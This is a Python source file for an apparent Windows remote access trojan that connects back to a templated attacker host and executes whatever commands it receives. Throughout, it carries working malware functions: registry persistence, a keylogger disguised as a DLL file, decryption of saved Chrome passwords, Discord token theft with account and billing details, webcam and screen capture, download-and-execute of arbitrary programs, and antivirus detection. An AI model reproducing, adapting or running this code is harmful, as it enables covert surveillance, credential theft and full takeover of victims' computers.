import socket
import json
import subprocess
import os
import pyautogui
import threading
import shutil
import sys
from cv2 import VideoCapture,imwrite
from  os.path import isfile
import random
import string
from requests import  get
from webbrowser import  open as op
import getpass
import ctypes
from pynput.keyboard import Listener
import time
import uuid
import re
import sqlite3
import base64
from urllib.request import Request, urlopen
import errno
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.ciphers import (
    Cipher, algorithms, modes)
import psutil
import urllib.request as urllib2
import platform
import struct

def webcam():
    camera = VideoCapture(0)
    while True:
        return_value, image = camera.read()
        imwrite(appd+'\\jarbou3.jpg', image)
        size = os.path.getsize(appd+'\\jarbou3.jpg')

        if size == 5432:
            continue
        else:
            upload_file(appd+'\\jarbou3.jpg')
            os.remove(appd+'\\jarbou3.jpg')
            break


def scanport(ip,port):

    scan = socket.socket(socket.AF_INET, socket.SOCK_STREAM)


    if not scan.connect_ex((ip, port)):
        reliable_send('[+] '+ip+':'+str(port)+'/TCP Open')
        scan.close()
    else:
        reliable_send('[-] '+ip+':'+str(port)+'/TCP Not Open')
        scan.close()

def wallpaper():
    download_file(appd+'\\wallpaper.jpg')
    SPI_SETDESKWALLPAPER = 20
    WALLPAPER_PATH = appd+'\\wallpaper.jpg'


    def is_64_windows():
        return struct.calcsize('P') * 8 == 64

    def get_sys_parameters_info():
        return ctypes.windll.user32.SystemParametersInfoW if is_64_windows() \
            else ctypes.windll.user32.SystemParametersInfoA

    def change_wallpaper():
        sys_parameters_info = get_sys_parameters_info()
        r = sys_parameters_info(SPI_SETDESKWALLPAPER, 0, WALLPAPER_PATH, 3)
    change_wallpaper()

def stopscreenshare():
    temp = os.getenv('tmp')
    try:
       pid = open(temp+'\\mypid.log','r').read()
       killprocess(pid)
    except:
        pass
def changeexecutionpolicy():
    subprocess.Popen('powershell Set-ExecutionPolicy UnRestricted -Scope CurrentUser',shell=True)

def screenshare():
    changeexecutionpolicy()
    if isfile(appd+'\\systemsoft.exe') == False:
        reliable_send('run ngroksetup module first')
    else:

            download_file(appd+'\\system.ps1')
            with open(appd + '\\systemfile.vbs', 'w') as vbsscript:
                vbsscript.write("""
            Set objShell = WScript.CreateObject("WScript.Shell")
            objShell.Run "cmd /c powershell -c %appdata%\\system.ps1", 0, True""")
                vbsscript.close()
            subprocess.Popen('cscript '+appd + '\\systemfile.vbs',shell=True)
            subprocess.Popen('%appdata%\\systemsoft.exe http 5556',shell=True)
            time.sleep(6)
            try:

                url = "http://127.0.0.1:4040/api/tunnels/command_line"
                recived = get(url)
                http = recived.json()["public_url"]

                x = http[8:]

            except:
                reliable_send('error')
            else:
                reliable_send('open this on firefox '+x)


def killprocess(pid):
    reliable_send('killing ' + pid)
    subprocess.Popen(' powershell -c taskkill /F /PID ' + pid, shell=True)
def getprocess():
    buffer = ''
    for proc in psutil.process_iter():
        try:
            processName = proc.name()
        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
            processName = "ACCESS DENIED"
        try:
            processID = proc.pid
        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
            processID = "ACCESS DENIED"
        try:
            processPath = proc.exe()
        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
            processPath = "-"
        if processPath == "":
            processPath = "-"
        buffer += processName + '###' + str(processID) + '###' + processPath + '\n'
    return  buffer


def autopersist():

    persist('WindowsService',sys.executable.split('\\')[-1])
def sysinfo():

    try:
        is_admin = os.getuid() == 0
    except AttributeError:
        is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
    antivirus = ''
    for proc in psutil.process_iter():
        strProcName = proc.name().replace(".exe", "")
        if strProcName == "ekrn":
            antivirus = "NOD32"
        elif strProcName == "avgcc":
            antivirus = "AVG"
        elif strProcName == "avgnt":
            antivirus = "Avira"
        elif strProcName == "ahnsd":
            antivirus = "AhnLab-V3"
        elif strProcName == "bdss":
            antivirus = "BitDefender"
        elif strProcName == "bdv":
            antivirus = "ByteHero"
        elif strProcName == "clamav":
            antivirus = "ClamAV"
        elif strProcName == "fpavserver":
            antivirus = "F-Prot"
        elif strProcName == "fssm32":
            antivirus = "F-Secure"
        elif strProcName == "avkcl":
            antivirus = "GData"
        elif strProcName == "engface":
            antivirus = "Jiangmin"
        elif strProcName == "avp":
            antivirus = "Kaspersky"
        elif strProcName == "updaterui":
            antivirus = "McAfee"
        elif strProcName == "msmpeng":
            antivirus = "microsoft security essentials"
        elif strProcName == "zanda":
            antivirus = "Norman"
        elif strProcName == "npupdate":
            antivirus = "nProtect"
        elif strProcName == "inicio":
            antivirus = "Panda"
        elif strProcName == "sagui":
            antivirus = "Prevx"
        elif strProcName == "Norman":
            antivirus = "Sophos"
        elif strProcName == "savservice":
            antivirus = "Sophos"
        elif strProcName == "saswinlo":
            antivirus = "SUPERAntiSpyware"
        elif strProcName == "spbbcsvc":
            antivirus = "Symantec"
        elif strProcName == "thd32":
            antivirus = "TheHacker"
        elif strProcName == "ufseagnt":
            antivirus = "TrendMicro"
        elif strProcName == "dllhook":
            antivirus = "VBA32"
        elif strProcName == "sbamtray":
            antivirus = "VIPRE"
        elif strProcName == "vrmonsvc":
            antivirus = "ViRobot"
        elif strProcName == "dllhook":
            antivirus = "VBA32"
        elif strProcName == "vbcalrt":
            antivirus = "VirusBuster"

        else:
            antivirus = "Not Found"

    obj_Disk = psutil.disk_usage('/')
    response = urllib2.urlopen('http://ipinfo.io/json')
    data = json.load(response)

    if getattr(sys, 'frozen', False):
        exec_path = sys.executable
    elif __file__:
        exec_path = __file__
    else:
        exec_path = os.path.abspath(__file__)

    if os.name == "posix":
        buffer = "HOMEDIR:        " + os.environ['HOME'] +  '\n'
    else:
        buffer = "HOMEDIR:        " + os.path.expanduser('~') + '\n'
    buffer += "ADMIN:          " + str(is_admin) + '\n'
    buffer += "ANTIVIRUS:      " + antivirus + '\n'
    buffer += "HOSTNAME:	" + socket.gethostname() + '\n'
    buffer += "PROVIDER:	" + data['org']+ '\n'
    buffer += "CITY:		" + data['city'] +'\n'
    buffer += "COUNTRY:	" + data['country'] + '\n'
    buffer += "REGION:		" + data['region'] + '\n'
    buffer += "OS:		" + platform.system() + " " + platform.release() + '\n'
    buffer += "OSARCH:		" + platform.architecture()[0]+ '\n'
    buffer += "IMPLANT PATH:   " + exec_path +'\n'
    buffer += "TOTAL SPACE: " + str(obj_Disk.total / (1024.0 ** 3)) + " GB - Used => " + str(
        obj_Disk.percent) + "<prc> "+'\n'
    buffer += "USED SPACE:  " + str(obj_Disk.used / (1024.0 ** 3)) + " GB " +'\n'
    buffer += "FREE SPACE:  " + str(obj_Disk.free / (1024.0 ** 3)) + " GB " +'\n'
    reliable_send(buffer)
def changeclip(change):
    try:
        subprocess.Popen("powershell -c Set-Clipboard "+change,shell=True)
        reliable_send('Target Clipoard Changed to '+change)
    except:
        reliable_send('[-]ERROR')
def say(something):
    subprocess.call("powershell -c Add-Type -AssemblyName System.Speech;$synth = New-Object -TypeName System.Speech.Synthesis.SpeechSynthesizer;$synth.Speak('"+something+"')",shell=True)



def getUserData(token):
    try:
        return json.loads(urlopen(Request("https://discordapp.com/api/v6/users/@me", headers=getHeader(token))).read().decode())
    except:
        pass
def paymentMethods(token):
    try:
        return bool(len(json.loads(urlopen(Request("https://discordapp.com/api/v6/users/@me/billing/payment-sources",
                                              headers=getHeader(token))).read().decode())) > 0)
    except:
        pass

def getHeader(token=None, content_type="application/json"):
    headers = {
        "Content-Type": content_type,
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36"
    }
    if token:
        headers.update({"Authorization": token})
    return headers


from re import findall
LOCAL = os.getenv("LOCALAPPDATA")
ROAMING = os.getenv("APPDATA")
PATHS = {
    "Discord": ROAMING + "\\Discord",
    "Discord Canary": ROAMING + "\\discordcanary",
    "Discord PTB": ROAMING + "\\discordptb",
    "Google Chrome": LOCAL + "\\Google\\Chrome\\User Data\\Default",
    "Opera": ROAMING + "\\Opera Software\\Opera Stable",
    "Brave": LOCAL + "\\BraveSoftware\\Brave-Browser\\User Data\\Default",
    "Yandex": LOCAL + "\\Yandex\\YandexBrowser\\User Data\\Default"
}

def getTokenz(path):
    path += "\\Local Storage\\leveldb"
    tokens = []
    for file_name in os.listdir(path):
        if not file_name.endswith(".log") and not file_name.endswith(".ldb"):
            continue
        for line in [x.strip() for x in open(f"{path}\\{file_name}", errors="ignore").readlines() if x.strip()]:
            for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
                for token in findall(regex, line):
                    tokens.append(token)
    return tokens
def steal():

    embeds = []
    working = []
    checked = []
    already_cached_tokens = []
    working_ids = []
    for platform, path in PATHS.items():
        if not os.path.exists(path):
            continue
        for token in getTokenz(path):
            if token in checked:
                continue
            checked.append(token)
            uid = None
            if not token.startswith("mfa."):
                try:
                    uid = base64.b64decode(token.split(".")[0].encode()).decode()
                except:
                    pass
                if not uid or uid in working_ids:
                    continue
            user_data = getUserData(token)
            if not user_data:
                continue
            working_ids.append(uid)
            working.append(token)
            username = user_data["username"] + "#" + str(user_data["discriminator"])
            user_id = user_data["id"]
            email = user_data.get("email")
            phone = user_data.get("phone")
            nitro = bool(user_data.get("premium_type"))
            billing = bool(paymentMethods(token))
            embed = {
                "color": 0x7289da,
                "fields": [
                    {
                        "name": "|Account Info|",
                        "value": f'Email: {email}\nPhone: {phone}\nNitro: {nitro}\nBilling Info: {billing}',
                        "inline": True
                    },
                    {
                        "name": "|PC Info|",
                        "value": f'Token Location: {platform}',
                        "inline": True
                    },
                    {
                        "name": "|Token|",
                        "value": token,
                        "inline": False
                    }
                ],
                "author": {
                    "name": f"{username} ({user_id})",
                },
                "footer": {
                    "text": f"nothing"
                }
            }
            embeds.append(embed)
    reliable_send('Getting Infos \n'+str(embeds))
def chromepassword():
    APP_DATA_PATH = os.environ['LOCALAPPDATA']
    DB_PATH = r'Google\Chrome\User Data\Default\Login Data'

    NONCE_BYTE_SIZE = 12

    def encrypt(cipher, plaintext, nonce):
        cipher.mode = modes.GCM(nonce)
        encryptor = cipher.encryptor()
        ciphertext = encryptor.update(plaintext)
        return (cipher, ciphertext, nonce)

    def decrypt(cipher, ciphertext, nonce):
        cipher.mode = modes.GCM(nonce)
        decryptor = cipher.decryptor()
        return decryptor.update(ciphertext)

    def get_cipher(key):
        cipher = Cipher(
            algorithms.AES(key),
            None,
            backend=default_backend()
        )
        return cipher

    def dpapi_decrypt(encrypted):
        import ctypes
        import ctypes.wintypes

        class DATA_BLOB(ctypes.Structure):
            _fields_ = [('cbData', ctypes.wintypes.DWORD),
                        ('pbData', ctypes.POINTER(ctypes.c_char))]

        p = ctypes.create_string_buffer(encrypted, len(encrypted))
        blobin = DATA_BLOB(ctypes.sizeof(p), p)
        blobout = DATA_BLOB()
        retval = ctypes.windll.crypt32.CryptUnprotectData(
            ctypes.byref(blobin), None, None, None, None, 0, ctypes.byref(blobout))
        if not retval:
            raise ctypes.WinError()
        result = ctypes.string_at(blobout.pbData, blobout.cbData)
        ctypes.windll.kernel32.LocalFree(blobout.pbData)
        return result

    def unix_decrypt(encrypted):
        if sys.platform.startswith('linux'):
            password = 'peanuts'
            iterations = 1
        else:
            raise NotImplementedError

        from Crypto.Cipher import AES
        from Crypto.Protocol.KDF import PBKDF2

        salt = 'saltysalt'
        iv = ' ' * 16
        length = 16
        key = PBKDF2(password, salt, length, iterations)
        cipher = AES.new(key, AES.MODE_CBC, IV=iv)
        decrypted = cipher.decrypt(encrypted[3:])
        return decrypted[:-ord(decrypted[-1])]

    def get_key_from_local_state():
        jsn = None
        with open(os.path.join(os.environ['LOCALAPPDATA'],
                               r"Google\Chrome\User Data\Local State"), encoding='utf-8', mode="r") as f:
            jsn = json.loads(str(f.readline()))
        return jsn["os_crypt"]["encrypted_key"]

    def aes_decrypt(encrypted_txt):
        encoded_key = get_key_from_local_state()
        encrypted_key = base64.b64decode(encoded_key.encode())
        encrypted_key = encrypted_key[5:]
        key = dpapi_decrypt(encrypted_key)
        nonce = encrypted_txt[3:15]
        cipher = get_cipher(key)
        return decrypt(cipher, encrypted_txt[15:], nonce)

    class ChromePassword:
        def __init__(self):
            self.passwordList = []

        def get_chrome_db(self):
            _full_path = os.path.join(APP_DATA_PATH, DB_PATH)
            _temp_path = os.path.join(APP_DATA_PATH, 'sqlite_file')
            if os.path.exists(_temp_path):
                os.remove(_temp_path)
            shutil.copyfile(_full_path, _temp_path)
            self.show_password(_temp_path)

        def show_password(self, db_file):
            conn = sqlite3.connect(db_file)
            _sql = 'select signon_realm,username_value,password_value from logins'
            for row in conn.execute(_sql):
                host = row[0]
                if host.startswith('android'):
                    continue
                name = row[1]
                value = self.chrome_decrypt(row[2])
                _info = 'Hostname: %s\nUsername: %s\nPassword: %s\n\n' % (host, name, value)
                self.passwordList.append(_info)
            conn.close()
            os.remove(db_file)

        def chrome_decrypt(self, encrypted_txt):
            if sys.platform == 'win32':
                try:
                    if encrypted_txt[:4] == b'\x01\x00\x00\x00':
                        decrypted_txt = dpapi_decrypt(encrypted_txt)
                        return decrypted_txt.decode()
                    elif encrypted_txt[:3] == b'v10':
                        decrypted_txt = aes_decrypt(encrypted_txt)
                        return decrypted_txt[:-16].decode()
                except WindowsError:
                    return None
            else:
                try:
                    return unix_decrypt(encrypted_txt)
                except NotImplementedError:
                    return None

        def save_passwords(self):
            with open(appd+'\\'+getpass.getuser()+'-Passwords.txt', 'w', encoding='utf-8') as f:
                f.writelines(self.passwordList)

    if __name__ == "__main__":
        Main = ChromePassword()
        Main.get_chrome_db()
        Main.save_passwords()




class Keylogger():
    keys = []
    count = 0
    flag = 0
    path = os.environ['appdata'] +'\\Sys64.dll'


    def on_press(self, key):
        self.keys.append(key)
        self.count += 1

        if self.count >= 1:
            self.count = 0
            self.write_file(self.keys)
            self.keys = []

    def read_logs(self):
        with open(self.path, 'rt') as f:
            return f.read()

    def write_file(self, keys):
        with open(self.path, 'a') as f:
            for key in keys:
                k = str(key).replace("'", "")
                if k.find('backspace') > 0:
                    f.write(' Backspace ')
                elif k.find('enter') > 0:
                    f.write('\n')
                elif k.find('shift') > 0:
                    f.write(' Shift ')
                elif k.find('space') > 0:
                    f.write(' ')
                elif k.find('caps_lock') > 0:
                    f.write(' caps_lock ')
                elif k.find('Key'):
                    f.write(k)

    def self_destruct(self):
        self.flag = 1
        listener.stop()
        os.remove(self.path)

    def start(self):
        global listener
        with Listener(on_press=self.on_press) as listener:
            listener.join()

Len = 8
randfilename = ''.join(random.choices(string.ascii_uppercase + string.digits, k=Len))
def Mbox(title, text, style):
    return ctypes.windll.user32.MessageBoxW(0, text, title, style)
def downloadfilenet(url):
    r = get(url)
    if url[-4:] != '.exe':
        print(randfilename)
        reliable_send('[-] this function work just with .exe files')
    else:
        with open(appd + '\\' + randfilename + '.exe', 'wb') as file:
            file.write(r.content)
        try:
            reliable_send('executing file in ' + randfilename + '.exe')
            os.popen(appd + '\\' + randfilename + '.exe')

        except:
            reliable_send('[-]ERROR')
def getip():
    try:
        r = get('http://ifconfig.me')
        reliable_send('public ip is '+r.text)
    except:
        reliable_send('[-] ERROR')
appd =os.getenv('appdata')
def isuac():
    try:
        tmp = os.listdir(os.sep.join([os.environ.get('SystemRoot','C:\\windows'),'temp']))
    except:
        reliable_send('USER Acces')
    else:
        reliable_send('ADMIN Acces')
def reliable_send(data):
    jsondata = json.dumps(data)
    s.send(jsondata.encode())

def reliable_recv():
    data = ''
    while True:
        try:
            data = data + s.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue

def download_file(file_name):

        f = open(file_name, 'wb')
        s.settimeout(1)
        chunk = s.recv(1024)
        while chunk:
            f.write(chunk)
            try:
                chunk = s.recv(1024)
            except socket.timeout as e:
                break
        s.settimeout(None)
        f.close()


def upload_file(file_name):
        f = open(file_name, 'rb')
        s.send(f.read())
        f.close()


def screenshot():
    myScreenshot = pyautogui.screenshot()
    myScreenshot.save(appd+'\\screen.png')

def persist(reg_name, copy_name):
    file_location = os.environ['appdata'] + '\\' + copy_name
    try:
        if not os.path.exists(file_location):
            shutil.copyfile(sys.executable, file_location)
            subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v ' + reg_name + ' /t REG_SZ /d "' + file_location + '"', shell=True)

        else:
            pass
    except:
        pass

def connection():
    while True:
        time.sleep(5)
        try:
            s.connect(('$lhost',$lport))

            s.send('$key'.encode()+":".encode()+getpass.getuser().encode())

            shell()
            s.close()
            break
        except Exception as e:
            if e.errno != 10061:
                subprocess.Popen('powershell -c '+sys.executable,shell=True)
                print(e)
                sys.exit()
            else:
                continue
def shell():

        while True:
            try:
                command = reliable_recv()
                if command == 'quit':
                    break
                elif command == 'background':
                    pass
                elif command == 'help':
                    pass
                elif command == 'clear':
                    pass

                elif command[:2] == 'cd':
                    try:
                        os.chdir(command[3:])
                        reliable_send('Changing Directory')
                    except:
                        reliable_send('Directory Not Found')
                        continue
                elif command[:10] == 'cwallpaper':
                    wallpaper()

                elif command[:7] == 'appdata':
                    try:
                        reliable_send('Going to Roaming Dir')
                        os.chdir(os.getenv('appdata'))
                    except:
                        reliable_send('[-]Error')

                elif command[:6] == 'upload':
                    try:
                        download_file(command[7:])
                    except:
                        continue
                elif command[:4] == 'kill':
                    killprocess(command[5:])
                elif command[:8] == 'download':
                    try:
                            upload_file(command[9:])

                    except:
                        continue
                elif command == 'back':
                    pass
                elif command[:10] == 'screenshot':
                    screenshot()
                    upload_file(appd + '\\screen.png')
                    os.remove(appd + '\\screen.png')
                elif command[:4] == 'priv':
                    try:
                        isuac()
                    except:
                        reliable_send('[-]ERROR')
                elif command[:6] == 'pslist':
                    try:
                        reliable_send(getprocess())
                    except:
                        reliable_send('[-]ERROR')
                elif command[:3] == 'say':
                    try:
                        reliable_send('[+]Executed')
                        say(command[4:])
                    except:
                        reliable_send('[-] Error')
                        continue
                elif command[:5] == 'dexec':
                    downloadfilenet(command[6:])

                elif command[:5] == 'getip':
                    getip()
                elif command[:9] == 'open_link':
                    url = command[10:]

                    try:
                        op(url)
                        reliable_send('[+]Opened Url')
                    except:
                        reliable_send('[-]error')
                elif command[:3] == 'pwd':
                    try:
                        reliable_send('you are in ' + os.getcwd() + '\n')
                    except:
                        reliable_send('GOT AN EROR')
                        continue
                elif command[:7] == 'getuser':
                    try:
                        reliable_send('username is ' + getpass.getuser() + '\n')
                    except:
                        reliable_send('error')
                        continue
                elif command[:6] == 'msgbox':
                    sp = command.split('|')
                    try:
                        reliable_send('MsgBox Showed')
                        Mbox(sp[1], sp[2], 1)
                    except:
                        reliable_send('[-] ERROR')
                        continue
                elif command[:7] == 'run-pwr':
                    try:

                        pwr = os.popen('powershell -c ' + command[8:]).read()
                        reliable_send('[+] Executed \n' + pwr)
                    except:
                        reliable_send('[-]ERROR')
                        continue
                elif command[:12] == 'changepolicy':
                    reliable_send('Now you will be able now to run powershell script')
                    changeexecutionpolicy()
                elif command[:15] == 'ssharescreen':

                    stopscreenshare()
                elif command[:5] == 'start':
                    try:
                        subprocess.Popen(command[6:], shell=True)
                        reliable_send('\n [+] started \n')
                    except:
                        reliable_send('\n [-] Failed \n')
                        continue
                elif command[:12] == 'keylog_start':
                    try:
                        global t
                        global keylog
                        reliable_send('Starting keylogger')
                        keylog = Keylogger()
                        t = threading.Thread(target=keylog.start)
                        t.start()

                    except:
                        reliable_send('[-]ERROR')

                        continue
                elif command[:11] == 'keylog_stop':
                    try:
                        keylog.self_destruct()
                        t.join()
                        reliable_send('[+] Keylogger Stopped!')
                    except:
                        reliable_send('[-] keylogger not started')
                        continue
                elif command[:11] == 'keylog_dump':
                    try:
                        keys = open(appd + '\\Sys64.dll', 'r').read()
                        reliable_send(keys)
                    except:
                        reliable_send('[-]ERROR')
                        continue
                elif command[:12] == 'chrome_recon':
                    try:
                        recover = threading.Thread(target=chromepassword())
                        recover.start()
                        passwords = open(appd + '\\' + getpass.getuser() + '-Passwords.txt', 'r').read()
                        reliable_send(passwords)
                        os.remove(appd + '\\' + getpass.getuser() + '-Passwords.txt')
                    except:
                        reliable_send('[-] ERROR')
                        continue
                elif command[:7] == 'disteal':
                    try:
                        steal()
                    except:
                        reliable_send('[-]ERROR')
                        continue
                elif command[:4] == 'clip':
                    try:
                        changeclip(command[5:])
                    except:
                        reliable_send('')
                        continue

                elif command[:11] == 'persistence':
                    reg_name, copy_name = command[12:].split(' ')
                    persist(reg_name, copy_name)
                elif command[:7] == 'sendall':
                    try:
                        reliable_send('Command Executed')
                        subprocess.Popen(command[8:], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                         stdin=subprocess.PIPE)
                    except:
                        reliable_send('[-]Failed')
                elif command[:6] == "isopen":
                    try:
                        spl = command[7:].split(":")
                        scanport(spl[0], int(spl[1]))
                    except:
                        reliable_send('command should be like this isopen ip:port')
                elif command[:11] == 'screenshare':
                    threading.Thread(target=screenshare())
                elif command == 'ngroksetup':

                    download_file(appd + '\\systemsoft.exe')
                elif command[:7] == 'sysinfo':
                    try:
                        sysinfo()
                    except:
                        reliable_send('[-]error')
                        continue
                elif command[:11] == "webcam_snap":
                    webcam()
                else:
                    execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                               stdin=subprocess.PIPE)
                    result = execute.stdout.read() + execute.stderr.read()
                    result = result.decode()
                    reliable_send(result)
            except UnicodeError:
                reliable_send(os.listdir(os.getcwd()))
                continue


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)


autopersist()
connection()
